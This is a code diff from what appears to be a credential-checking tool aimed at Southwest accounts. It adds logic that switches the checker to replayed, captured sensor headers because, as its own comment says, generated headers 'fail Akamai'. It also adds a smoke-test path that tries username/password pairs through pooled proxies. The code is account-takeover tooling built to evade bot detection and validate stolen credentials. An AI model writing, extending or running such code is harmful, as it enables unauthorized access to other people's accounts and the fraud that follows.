@@ -141,17 +141,36 @@ def _proxy_key(proxy: str | None) -> str:
     return proxy or "__direct__"
 
 
+def _resolve_checker_mode(
+    settings: JobSettings,
+) -> tuple[bool, bool, dict[str, Any] | None]:
+    """Prefer capture template mode when available — kernel bootstrap headers fail Akamai."""
+    capture_data = settings.capture_data
+    full_bootstrap = settings.full_bootstrap
+    auto_sensors = settings.auto_sensors
+
+    if capture_data and capture_data.get("sensor_headers"):
+        if full_bootstrap and not auto_sensors:
+            full_bootstrap = False
+            auto_sensors = True
+        elif auto_sensors:
+            full_bootstrap = False
+
+    return full_bootstrap, auto_sensors, capture_data
+
+
 def _get_shared_checker(proxy: str | None) -> tuple[SouthwestChecker, threading.Lock]:
     key = _proxy_key(proxy)
     with _pool_lock:
         entry = _checkers.get(key)
         if entry is None:
             settings = get_job_settings()
+            full_bootstrap, auto_sensors, capture_data = _resolve_checker_mode(settings)
             checker = SouthwestChecker(
                 proxy=proxy,
-                full_bootstrap=settings.full_bootstrap,
-                auto_sensors=settings.auto_sensors,
-                capture_data=settings.capture_data,
+                full_bootstrap=full_bootstrap,
+                auto_sensors=auto_sensors,
+                capture_data=capture_data,
             )
             entry = (checker, threading.Lock())
             _checkers[key] = entry
@@ -227,10 +246,35 @@ def check_account(
     *,
     proxy: Any = _UNSET,
     timeout: int = 45,
+    smoke_test: bool = False,
 ) -> WebCheckResult:
     del timeout
     settings = get_job_settings()
     proxy_url = None if proxy is _UNSET else proxy
+
+    if smoke_test:
+        reset_runtime_state()
+        full_bootstrap, auto_sensors, capture_data = _resolve_checker_mode(settings)
+        if not capture_data or not capture_data.get("sensor_headers"):
+            return WebCheckResult(
+                status="ERROR",
+                username=username,
+                password=password,
+                line=(
+                    "[ERROR] Smoke test requires sensor_config.json on server "
+                    "(capture mode). Upload via Capture mode in the UI."
+                ),
+                data={"error": "missing sensor_config.json"},
+            )
+        checker = SouthwestChecker(
+            proxy=proxy_url,
+            full_bootstrap=full_bootstrap,
+            auto_sensors=auto_sensors,
+            capture_data=capture_data,
+        )
+        result = checker.check(username, password, retries=1)
+        return _to_web_result(username, password, result)
+
     _wait_for_backoff()
 
     if settings.request_delay > 0:
